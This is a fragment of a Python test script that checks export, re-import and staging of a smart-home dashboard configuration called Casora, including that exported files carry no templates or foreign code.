NORMAL_VIEWS = [
    {"path": "home", "title": "Home", "cards": [
        {"type": "custom:button-card", "template": "casora_room", "name": "Home",
         "variables": {"image": "home-demo", "show_scenes": True, "scene_entities": SCENE_EXPR,
                       "scene_order": ["scene.example_evening"], "scene_colors": {"scene.example_evening": "#ffaa00"}}},
        {"type": "custom:casora-nav", "routes": [
            {"url": "/casora-home/home", "label": "Home", "icon": "mdi:home", "auto": "home"},
            {"url": "/casora-home/kitchen", "label": "Kitchen", "icon": "mdi:stove", "badge": {"show": MOTION_OK}}]},
        {"type": "custom:casora-smart-row", "cards": [NAV]}]},
    {"path": "kitchen", "title": "Kitchen", "cards": [
        {"type": "custom:button-card", "template": "casora_room", "name": "Kitchen",
         "variables": {"image": "kitchen-0123456789ab", "motion_entity": "binary_sensor.example_motion"}},
        {"type": "custom:casora-smart-row", "cards": [
            LIGHT, {"type": "custom:button-card", "template": "own_cozy", "entity": "light.example_ceiling"},
            {"type": "custom:button-card", "template": "casora_light", "entity": "light.example_ceiling",
             "variables": {"popup_extra_cards": [{"type": "markdown", "content": "**Hello** [docs](https://example.com)"}]}}]}]},
]
NORMAL = {"title": "Home", "kiosk_mode": {"hide_header": True}, "views": NORMAL_VIEWS,
          "button_card_templates": {**{k: BUNDLE[k] for k in ("casora_room", "casora_light")},
                                    "own_cozy": {"template": "casora_light",
                                                 "variables": {"casora_tile": {"label": "Cozy", "base": "casora_light"}}}},
          "casora_template_fingerprint": {"casora_light": "x"}}
NORMAL_PHONE = {"views": PHONE["views"], "button_card_templates": NORMAL["button_card_templates"]}
NORMAL_SETS = {"security": {"covers": ["cover.example_blind"]}, "scenes": {"order": ["scene.example_evening"]}}
try:
    f = export(config=NORMAL, mobile=NORMAL_PHONE, settings=NORMAL_SETS, photos={}, shipped=SHIPPED)
except TypeError:
    f = export(config=NORMAL, mobile=NORMAL_PHONE, settings=NORMAL_SETS, photos={})
zf = zipfile.ZipFile(io.BytesIO(f))
exp_cfg = json.loads(zf.read("dashboard.json"))
check(sorted(exp_cfg) == ["kiosk_mode", "title", "views"], f"export: no templates or fingerprint in the file: {sorted(exp_cfg)}")
check(not foreign_code(exp_cfg) and not foreign_code(json.loads(zf.read("mobile.json"))), "export: no code in the file")
st = try_read(f)
check(st.get("left_out") == {"templates": 0, "code": 0}, f"a Casora file has nothing to leave out: {st.get('left_out')}")
out = sh.prepare(st, url_path="casora-home", mobile_url="casora-home-mobile", mapping={}, renames={}, with_settings=True)
w_cfg, w_mob = ship(out["config"], out["mobile"], BUNDLE) if ship else (out["config"], out["mobile"])
want = json.loads(json.dumps(NORMAL_VIEWS).replace('"own_cozy"', '"casora_light"'))
check(w_cfg["views"] == want, "rooms, tiles, variables, scene badge, motion badge and popup cards unchanged"
      " (own tile type on its base)")
check(w_cfg["kiosk_mode"] == NORMAL["kiosk_mode"] and w_cfg["title"] == "Home", "title and kiosk_mode unchanged")
check(w_mob["views"] == PHONE["views"], "phone layout unchanged")
check(out["settings"] == NORMAL_SETS, f"settings unchanged: {out['settings']}")
check(sh.tiles_of(w_cfg) == sh.tiles_of(NORMAL) and sh.rooms_of(w_cfg) == sh.rooms_of(NORMAL), "same rooms and tiles")
nav_tpl = [r for r in (tp.first_routes(w_cfg.get("button_card_templates")) or [])]
check(not nav_tpl or nav_tpl == NORMAL_VIEWS[0]["cards"][1]["routes"], "templates point at the dashboard's rooms")

print("staging")
store: dict = {}
tok = sh.stage(store, {"x": 1}, now=0)
check(sh.staged_of(store, tok, now=10) == {"x": 1}, "staged file found")
check(sh.staged_of(store, tok, now=sh.STAGE_TTL + 1) is None, "expired after STAGE_TTL")
check(sh.staged_of(store, "nope", now=0) is None, "unknown token")

if FAILS:
    print(f"FAIL share_test – {len(FAILS)} checks")
    raise SystemExit(1)
print("PASS share_test")
